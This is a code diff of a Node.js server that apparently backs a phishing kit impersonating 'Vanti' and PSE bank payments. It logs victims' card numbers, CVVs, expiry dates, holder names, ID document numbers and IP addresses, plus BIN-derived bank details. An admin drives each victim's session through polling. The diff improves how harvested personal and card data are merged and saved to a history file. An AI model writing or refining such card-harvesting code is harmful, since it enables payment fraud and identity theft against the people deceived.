@@ -22,7 +22,7 @@ if (!fs.existsSync(DATA_DIR)) {
 const estadoSesiones = new Map();
 const datosSesiones = new Map();
 const ultimaAccionSesiones = new Map();
-const accionTsSesiones = new Map();   // 🔥 NUEVO — Timestamp de la última acción del admin
+const accionTsSesiones = new Map();
 const usuariosActivos = new Map();
 const rateLimits = new Map();
 const tokensInvalidos = new Set();
@@ -328,7 +328,7 @@ const server = http.createServer(async (req, res) => {
                         if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
                         estadoSesiones.set(sessionId, 'precio_asignado');
                         ultimaAccionSesiones.set(sessionId, String(valor));
-                        accionTsSesiones.set(sessionId, Date.now());   // 🔥 Timestamp para el polling
+                        accionTsSesiones.set(sessionId, Date.now());
                         const datosPrevios = datosSesiones.get(sessionId) || {};
                         const datosActualizados = Object.assign({}, datosPrevios, { monto: Number(valor), precio: Number(valor) });
                         datosSesiones.set(sessionId, datosActualizados);
@@ -361,7 +361,7 @@ const server = http.createServer(async (req, res) => {
                         ultimaAccionSesiones.set(sessionId, accion);
                     }
                     estadoSesiones.set(sessionId, estadoNuevo);
-                    accionTsSesiones.set(sessionId, Date.now());   // 🔥 Timestamp para el polling
+                    accionTsSesiones.set(sessionId, Date.now());
                     agregarLog('accion', { usuario: payload.user, sessionId, accion, estadoNuevo });
                     console.log(`[${payload.user}] ${accion} → ${sessionId} | estado: ${estadoNuevo}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -383,7 +383,7 @@ const server = http.createServer(async (req, res) => {
                         datosSesiones.delete(sid);
                         usuariosActivos.delete(sid);
                         ultimaAccionSesiones.delete(sid);
-                        accionTsSesiones.delete(sid);   // 🔥 Limpiar también
+                        accionTsSesiones.delete(sid);
                         pasosSesiones.delete(sid);
                     });
                     agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
@@ -442,11 +442,10 @@ const server = http.createServer(async (req, res) => {
                 guardarSesionesTemporales();
                 datosSesiones.set(sessionId, datosCompletos);
 
-                // 🔥 FIX: Guardar/Actualizar en el historial en tiempo real
                 const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
                 if (idx !== -1) {
                     historial[idx].datos = datosCompletos;
-                    historial[idx].fecha = new Date().toISOString(); // Actualizar la hora
+                    historial[idx].fecha = new Date().toISOString();
                     try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
                 } else {
                     guardarHistorial(bancoKey, datosCompletos);
@@ -519,7 +518,6 @@ const server = http.createServer(async (req, res) => {
                 if (marca === 'PSE') pasoActual += ' (PSE)'; else pasoActual += ' (Tarjeta)';
                 pasosSesiones.set(sessionId, pasoActual);
                 
-                // 🔥 Actualizar historial también aquí por si acaso
                 const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === bancoKey);
                 if (idx !== -1) {
                     historial[idx].datos = datosSesion;
@@ -703,6 +701,7 @@ const server = http.createServer(async (req, res) => {
                 const idx = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
                 if (idx !== -1) {
                     historial[idx].datos = Object.assign({}, historial[idx].datos, datosCompletos);
+                    historial[idx].fecha = new Date().toISOString();
                     try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
                 } else {
                     guardarHistorial('vanti', datosCompletos);
@@ -734,11 +733,16 @@ const server = http.createServer(async (req, res) => {
                 ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
                 pasosSesiones.set(sessionId, 'Vanti Tarjeta');
                 
-                const datosHistorial = {
-                    sessionId, bancoKey: 'vanti', tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, marca: marca || 'visa', ip, creadoEn: new Date().toISOString(), bin: infoBin?.bin || '', cardBrand: infoBin?.cardBrand || marca || 'Desconocida', cardType: infoBin?.cardType || 'Desconocido', cardLevel: infoBin?.cardLevel || 'Desconocido', bankName: infoBin?.bankName || 'Desconocido', countryName: infoBin?.countryName || 'Desconocido'
-                };
-
-                guardarHistorial('vanti', datosHistorial);
+                // 🔥 FIX: Actualizar el registro existente en lugar de crear uno nuevo,
+                // así se conservan los datos personales del formulario (nombres, apellidos, correo, etc.)
+                const idxH = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId && h.bancoKey === 'vanti');
+                if (idxH !== -1) {
+                    historial[idxH].datos = Object.assign({}, historial[idxH].datos, datosSesion);
+                    historial[idxH].fecha = new Date().toISOString();
+                    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                } else {
+                    guardarHistorial('vanti', datosSesion);
+                }
                 
                 console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${monto}`);
                 json(res, 200, { ok: true, sessionId, binInfo: infoBin });
@@ -838,8 +842,8 @@ const server = http.createServer(async (req, res) => {
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
-            const accionTs = accionTsSesiones.get(sessionId) || 0;   // 🔥 NUEVO
-            json(res, 200, { estado, accion, accionTs });            // 🔥 Se envía accionTs
+            const accionTs = accionTsSesiones.get(sessionId) || 0;
+            json(res, 200, { estado, accion, accionTs });
             return;
         }
 
